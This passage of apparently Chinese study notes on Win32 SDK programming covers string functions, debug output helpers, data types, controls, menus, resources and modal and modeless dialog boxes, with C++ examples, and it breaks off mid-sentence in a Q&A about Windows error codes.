title="常用字符串处理函数"></a>常用字符串处理函数</h2><table><thead><tr><th></th><th>ASCLL版</th><th>UNICODE版</th><th>T版</th></tr></thead><tbody><tr><td>获取长度</td><td>strlen</td><td>wcsnlen</td><td>_tcslen</td></tr><tr><td>字符串拷贝</td><td>strcpy_s</td><td>wcscpy_s</td><td>_tcscpy_s</td></tr><tr><td>字符转数字</td><td>atoi</td><td>_wtoi</td><td>_tstoi</td></tr><tr><td>字符转数字</td><td>sscanf_s</td><td>swscanf_s</td><td>_stscanf_s</td></tr><tr><td>数字转字符</td><td>sprintf_s</td><td>swprintf_s</td><td>_stprintf_s</td></tr></tbody></table><h2 id="调试输出"><a href="#调试输出" class="headerlink" title="调试输出"></a>调试输出</h2><p>//变参函数，用于在输出款输出信息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> _trace(<span class="keyword">const</span> TCHAR* format, ...) </span><br><span class="line">&#123;</span><br><span class="line">  TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">  va_list argprt;</span><br><span class="line">  va_start(argprt, format);</span><br><span class="line">  <span class="comment">//将格式化信息写入指定缓冲区</span></span><br><span class="line">  wvsprintf(buffer, format, argprt);</span><br><span class="line">  va_end(argprt);</span><br><span class="line">  <span class="comment">//将缓冲区信息输出</span></span><br><span class="line">  OutputDebugString(buffer);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>//第一天所用例题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> _trace(<span class="keyword">const</span> TCHAR* format, ...) <span class="comment">//变参函数</span></span><br><span class="line">&#123;</span><br><span class="line">TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">va_list argptr;</span><br><span class="line">va_start(argptr, format);</span><br><span class="line"><span class="comment">//将格式化信息写入指定的缓冲区</span></span><br><span class="line">wvsprintf(buffer, format, argptr);</span><br><span class="line">va_end(argptr);</span><br><span class="line"><span class="comment">//将缓冲区信息输出</span></span><br><span class="line">OutputDebugString(buffer);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MyMessageBox</span><span class="params">(<span class="keyword">const</span> TCHAR* format, ...)</span> <span class="comment">//变参函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">va_list argptr;</span><br><span class="line">va_start(argptr, format);</span><br><span class="line"><span class="comment">//将格式化信息写入指定的缓冲区</span></span><br><span class="line">wvsprintf(buffer, format, argptr);</span><br><span class="line">va_end(argptr);</span><br><span class="line"><span class="comment">//将缓冲区信息输出</span></span><br><span class="line">MessageBox(<span class="number">0</span>,buffer,_T(<span class="string">&quot;提示&quot;</span>),<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyGetErrorInfo</span><span class="params">(LPCTSTR lpErrInfo,</span></span></span><br><span class="line"><span class="function"><span class="params">UINT unErrCode,</span></span></span><br><span class="line"><span class="function"><span class="params">UINT unLine)</span> <span class="comment">// unLine=__LINE__</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPTSTR lpMsgBuf = <span class="literal">nullptr</span>;</span><br><span class="line">WCHAR  szMessage[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">WCHAR  szCaption[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">FormatMessage(<span class="number">0x1300</span>, <span class="literal">NULL</span>, unErrCode,</span><br><span class="line"><span class="number">0x400</span>, (LPTSTR)&amp;lpMsgBuf, <span class="number">64</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">swprintf_s(szMessage, <span class="number">128</span>,</span><br><span class="line"><span class="string">L&quot;Error_0x%08X:%s&quot;</span>, unErrCode, lpMsgBuf);</span><br><span class="line"></span><br><span class="line">swprintf_s(szCaption, <span class="number">32</span>,</span><br><span class="line"><span class="string">L&quot;%s (Error Line:%05d)&quot;</span>, lpErrInfo, unLine);</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, szMessage, szCaption, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> APIENTRY <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">HINSTANCE hPreInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">LPSTR  lpCmdLine,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> nShow</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">OutputDebugString(_T(<span class="string">&quot;你好 呵呵&quot;</span>));</span><br><span class="line"></span><br><span class="line">_trace(_T(<span class="string">&quot;有两个数，分别是%d和%s&quot;</span>), <span class="number">100</span>, <span class="string">L&quot;你好&quot;</span>);</span><br><span class="line"></span><br><span class="line">MyMessageBox(_T(<span class="string">&quot;有两个数，分别是%d和%s&quot;</span>), <span class="number">100</span>, <span class="string">L&quot;你好&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//GetStdHandle(STD_OUTPUT_HANDLE);</span></span><br><span class="line">HANDLE hOut = GetStdHandle(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">int</span> nError = GetLastError();</span><br><span class="line">nError = <span class="number">10</span>;</span><br><span class="line">MyGetErrorInfo(<span class="string">L&quot;十五派友情提示&quot;</span>, nError, __LINE__);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>常用数据类型</p><table><thead><tr><th>Windows 数据类型</th><th>描述信息</th></tr></thead><tbody><tr><td>UINT</td><td>无符号32位整数</td></tr><tr><td>DWORD</td><td>整数</td></tr><tr><td>PDWORD</td><td>指向32位值的指针</td></tr><tr><td>BOOL</td><td>布尔（true/false）</td></tr><tr><td>SHORT</td><td>带符号16位整数</td></tr><tr><td>LPSTR</td><td>字符串指针</td></tr><tr><td>LPCSTR</td><td>字符串常量指针</td></tr><tr><td>WPARAM</td><td>32位的消息参数</td></tr><tr><td>LPARAM</td><td>32位的消息参数</td></tr><tr><td>LRESULT</td><td>32位函数返回值</td></tr><tr><td>HWND</td><td>窗口句柄</td></tr></tbody></table><h2 id="常用控件"><a href="#常用控件" class="headerlink" title="常用控件"></a>常用控件</h2><h3 id="标准控件"><a href="#标准控件" class="headerlink" title="标准控件"></a>标准控件</h3><p>响应消息：WM_COMMAND</p><p>控件时常见的窗口上的交互元素</p><p>当控件的特定功能被触发后，会主动发消息通知父窗口</p><p>父窗口可以通过发消息给控件</p><p>例如：控件的创建（button时按钮控件）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;控件名&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">440</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10016</span>, hInstance, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>标准控件时windows提供的基本控件，使用方式也比较简单，一下时常用的标准控件</p><table><thead><tr><th>窗口类名</th><th>控件名</th><th>英文</th></tr></thead><tbody><tr><td>“button”</td><td>按钮</td><td>Button</td></tr><tr><td>“button”</td><td>复选框</td><td>CheckBox</td></tr><tr><td>“button”</td><td>单选框</td><td>RadioButton</td></tr><tr><td>“static”</td><td>静态文本</td><td>Static Text</td></tr><tr><td>“static”</td><td>图片</td><td>Picture Control</td></tr><tr><td>“combobox”</td><td>复合框</td><td>ComBox</td></tr><tr><td>“edit”</td><td>编辑</td><td>Edit</td></tr><tr><td><strong>“listbox”</strong></td><td><strong>列表框</strong></td><td><strong>ListBox</strong></td></tr></tbody></table><p>滚动条 Slider Control控件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_HSCROLL:<span class="comment">//当水平的滑块滑动时，会产生这个消息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> nPos = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1. 先获取滑块的句柄</span></span><br><span class="line">HWND hSlider = GetDlgItem(hWnd, IDC_SLIDER1);</span><br><span class="line"><span class="comment">//2. 给滑块发消息 接收滑块移动的位置</span></span><br><span class="line">nPos = SendMessage(hSlider, TBM_GETPOS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//给滑块发消息，滑块句柄， 消息类型，   重绘，进度位置</span></span><br><span class="line"><span class="comment">//SendMessage(hSlider, TBM_SETPOS, true, 0);</span></span><br></pre></td></tr></table></figure><p>进度条</p><p>响应的还是WM_COMMAND消息，这个消息的WPARAM的低位时控件ID</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> nPos = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1. 获取进度条控件的句柄</span></span><br><span class="line">HWND hProcess = GetDlgItem(hWnd, IDC_PROGRESS1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 给进度条控件发消息，设置进度</span></span><br><span class="line">SendMessage(hProcess, PBM_SETPOS, nPos, <span class="number">0</span>);</span><br><span class="line">nPos += <span class="number">20</span>;</span><br><span class="line"><span class="keyword">if</span> (nPos&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line">nPos = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通用控件"><a href="#通用控件" class="headerlink" title="通用控件"></a>通用控件</h3><table><thead><tr><th>窗口类名</th><th>控件</th></tr></thead><tbody><tr><td>WC_LISTVIEW</td><td>列表框控件</td></tr><tr><td>WC_TREEVIEW</td><td>树控件</td></tr><tr><td>WC_TABCONTROL</td><td>Tab控件</td></tr><tr><td>HOTLEY_CLASS</td><td>热键控件</td></tr></tbody></table><p>列表框控件的创建</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据ID获取列表框控件的句柄</span></span><br><span class="line">HWND hListCtrl = GetDlgItem(hMain, IDC_LIST3);</span><br><span class="line"><span class="comment">//更改列表框的风格</span></span><br><span class="line">ListView_SetExtendedListViewStyle(hListCtrl, LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);</span><br><span class="line"><span class="comment">//添加第一列</span></span><br><span class="line">LVCOLUMN lv = &#123;&#125;;</span><br><span class="line">lv.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT;</span><br><span class="line">lv.cx = <span class="number">112</span>;<span class="comment">//112正好对应该窗口的宽度为4列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;年份&quot;</span>);</span><br><span class="line">lv.fmt = LVCFMT_CENTER;</span><br><span class="line">ListView_InsertColumn(hListCtrl, <span class="number">0</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第二列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;时间&quot;</span>);</span><br><span class="line">ListView_InsertColumn(hListCtrl, <span class="number">1</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第三列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;经历&quot;</span>);</span><br><span class="line">ListView_InsertColumn(hListCtrl, <span class="number">2</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第四列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;备注&quot;</span>);</span><br><span class="line">ListView_InsertColumn(hListCtrl, <span class="number">3</span>, &amp;lv);</span><br><span class="line"></span><br><span class="line">LVITEM  li = &#123;&#125;;</span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">0</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2009&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line">ListView_InsertItem(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line">ListView_SetItemText(hListCtrl, <span class="number">0</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line">ListView_SetItemText(hListCtrl, <span class="number">0</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学附中就读&quot;</span>));</span><br><span class="line">ListView_SetItemText(hListCtrl, <span class="number">0</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;班长一职&quot;</span>));</span><br><span class="line"><span class="comment">//添加第二行</span></span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">1</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2001&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line">ListView_InsertItem(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line">ListView_SetItemText(hListCtrl, <span class="number">1</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line">ListView_SetItemText(hListCtrl, <span class="number">1</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学&quot;</span>));</span><br><span class="line">ListView_SetItemText(hListCtrl, <span class="number">1</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;学生会主席&quot;</span>));</span><br></pre></td></tr></table></figure><h2 id="窗口风格"><a href="#窗口风格" class="headerlink" title="窗口风格"></a>窗口风格</h2><p>响应消息：WM_NOTIFY</p><p>窗口标准风格之</p><h3 id="三大窗口风格"><a href="#三大窗口风格" class="headerlink" title="三大窗口风格"></a>三大窗口风格</h3><table><thead><tr><th>重叠窗口</th><th>弹出窗口</th><th>子窗口</th></tr></thead><tbody><tr><td>WS_OVERLAPPEDWINODW</td><td>WS_POPUPWINDOW</td><td>WS_CHILDWINDOW</td></tr></tbody></table><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><table><thead><tr><th>函数名</th><th>说明</th></tr></thead><tbody><tr><td>CreateWindow</td><td>使用窗口类，创建窗口，创建控件</td></tr><tr><td>RegisterClass</td><td>注册窗口类</td></tr><tr><td>DialogBox</td><td>使用资源创建一个模态对话框</td></tr><tr><td>MoveWindow</td><td>移动窗口到指定位置</td></tr><tr><td>ShowWIndow</td><td>隐藏（SW_HWID）或显示(SW_SHOW)窗口</td></tr><tr><td>GetWindowText</td><td>获取窗口标题</td></tr><tr><td>SetWindowText</td><td>设置窗口标题</td></tr><tr><td>SetParent</td><td>更改指定窗口的父窗口</td></tr><tr><td>TrackPopupMeun</td><td>弹出菜单（坐标需要转换，需要获取子菜单的句柄）</td></tr><tr><td>GetSubMenu</td><td>获取指定子菜单的句柄</td></tr><tr><td>GetDlgItem</td><td>根据控件的ID获取子控件句柄</td></tr><tr><td>GetParent</td><td>获取父窗口句柄</td></tr><tr><td>FindWindow</td><td>找到一个窗口，获取其句柄</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="常用资源"><a href="#常用资源" class="headerlink" title="常用资源"></a>常用资源</h2><p>想要操作资源需先获得资源的句柄</p><h3 id="图标-Icon"><a href="#图标-Icon" class="headerlink" title="图标 Icon"></a>图标 Icon</h3><ul><li><p>需要有一个图标资源</p></li><li><p>LoadIcon根据资源ID得到句柄 </p></li><li><p>将句柄填充到窗口类上</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HBITMAP hBit_map = LoadBitmap(g_hInstance, MAKEINTRESOURCE(IDB_BITMAP1));</span><br><span class="line">HWND hPic=GetDlgItem(hMain, IDC_STATIC1);<span class="comment">//获取图片框资源句柄</span></span><br><span class="line">SendMessage(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</span><br></pre></td></tr></table></figure></li></ul><h3 id="光标-Cursor"><a href="#光标-Cursor" class="headerlink" title="光标 Cursor"></a>光标 Cursor</h3><ul><li>需要有一个光标资源</li><li>LoadCursor根据ID得到句柄</li><li>将句柄填充到窗口类上</li></ul><h3 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h3><ul><li>配合picture控件使用</li></ul><h3 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h3><ul><li><p>下拉菜单</p><ul><li>有一个菜单资源<ul><li>填充到窗口类中 直接填</li><li>填充到创建窗口的参数上，需要LoadMenu获取到句柄</li></ul></li></ul></li><li><p>弹出菜单</p><ul><li><p>TrackPopupMenu 提供坐标以及菜单的句柄</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_RBUTTONDOWN:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//这里得到的是窗口坐标</span></span><br><span class="line">DWORD dwX = LOWORD(lParam);</span><br><span class="line">DWORD dwY = HIWORD(lParam);</span><br><span class="line"><span class="comment">//我们需要将窗口坐标转换为屏幕坐标</span></span><br><span class="line">POINT pt = &#123; dwX ,dwY &#125;;</span><br><span class="line">ClientToScreen(hWnd, &amp;pt);</span><br><span class="line">    </span><br><span class="line">HMENU hMenu =  LoadMenu(g_hInstance, MAKEINTRESOURCE(IDR_MENU2));</span><br><span class="line">    </span><br><span class="line"><span class="comment">//获取子菜单的句柄</span></span><br><span class="line">HMENU hSubMenu = GetSubMenu(</span><br><span class="line">hMenu, <span class="comment">//父级菜单句柄</span></span><br><span class="line"><span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">TrackPopupMenu(</span><br><span class="line">hSubMenu,</span><br><span class="line">TPM_LEFTALIGN,</span><br><span class="line">pt.x,</span><br><span class="line">pt.y,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">hWnd,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="对话框资源"><a href="#对话框资源" class="headerlink" title="对话框资源"></a>对话框资源</h2><p>可视化编程</p><ul><li>DialogBox     模态对话框     会阻塞住父窗口</li><li>CreateDialog   非模态对话框   不会阻塞父窗口</li></ul><h3 id="模态对话框"><a href="#模态对话框" class="headerlink" title="模态对话框"></a>模态对话框</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;resource.h&quot;</span></span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">HINSTANCE hPreInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">LPSTR lpCmdLine,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> nCmdShow</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DialogBox(</span><br><span class="line">hInstance,</span><br><span class="line">MAKEINTRESOURCE(IDD_DIALOG1),</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">DlgProc</span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="非模态对话框"><a href="#非模态对话框" class="headerlink" title="非模态对话框"></a>非模态对话框</h3><p>CreateDialog</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include &lt;tchar.h&gt;</span><br><span class="line">#include &quot;resource.h&quot;</span><br><span class="line">INT_PTR CALLBACK DlgProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">int WINAPI WinMain(</span><br><span class="line">HINSTANCE hInstance,</span><br><span class="line">HINSTANCE hPreInstance,</span><br><span class="line">LPSTR lpCmdLine,</span><br><span class="line">int nCmdShow</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">HWND hDlg &#x3D; CreateDialog(</span><br><span class="line">hInstance,</span><br><span class="line">MAKEINTRESOURCE(IDD_DIALOG1),</span><br><span class="line">NULL,</span><br><span class="line">DlgProc</span><br><span class="line">);</span><br><span class="line">&#x2F;&#x2F;显示窗口</span><br><span class="line">ShowWindow(hDlg, SW_SHOW);</span><br><span class="line">MSG msg &#x3D; &#123;&#125;;</span><br><span class="line">&#x2F;&#x2F; 消息循环</span><br><span class="line">while (GetMessage(</span><br><span class="line">&amp;msg, &#x2F;&#x2F;获取到消息的结构体</span><br><span class="line">0,    &#x2F;&#x2F;获取哪一个窗口的消息，为0就是所有窗口</span><br><span class="line">0,</span><br><span class="line">0)</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;   5.2翻译消息</span><br><span class="line">TranslateMessage(&amp;msg);</span><br><span class="line">&#x2F;&#x2F;   5.3转发到消息回调函数</span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对话框控件的使用"><a href="#对话框控件的使用" class="headerlink" title="对话框控件的使用"></a>对话框控件的使用</h2><h3 id="单选框"><a href="#单选框" class="headerlink" title="单选框"></a>单选框</h3><p>有一个重要操作，需要记住：分组</p><p>ctrl+D之后将同一组的radio都编为连续的序号。</p><p>将每组的第一个radio设置group为true</p><h3 id="静态文本"><a href="#静态文本" class="headerlink" title="静态文本"></a>静态文本</h3><p>一个提示语直接拖拽即可</p><h3 id="静态图片"><a href="#静态图片" class="headerlink" title="静态图片"></a>静态图片</h3><p>能够显示一个bitmap的图片</p><p>需要一个picture的控件，然后去设置两个属性</p><p>一个bmp格式的图片资源</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1,初始化图片</span></span><br><span class="line">HBITMAP hBit_map = LoadBitmap(g_hInstance, MAKEINTRESOURCE(IDB_BITMAP1));</span><br><span class="line">HWND hPic=GetDlgItem(hMain, IDC_STATIC1);<span class="comment">//获取图片框资源句柄</span></span><br><span class="line">SendMessage(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</span><br></pre></td></tr></table></figure><h1 id="四、SDK问题"><a href="#四、SDK问题" class="headerlink" title="四、SDK问题"></a>四、SDK问题</h1><h2 id="问答1"><a href="#问答1" class="headerlink" title="问答1"></a>问答1</h2><p>1、什么是windows 错误码?应该在什么时候获取? 使用什么函数获取? 获取到之后如何<br> 查看其所代表的内容?<br> 答：windows 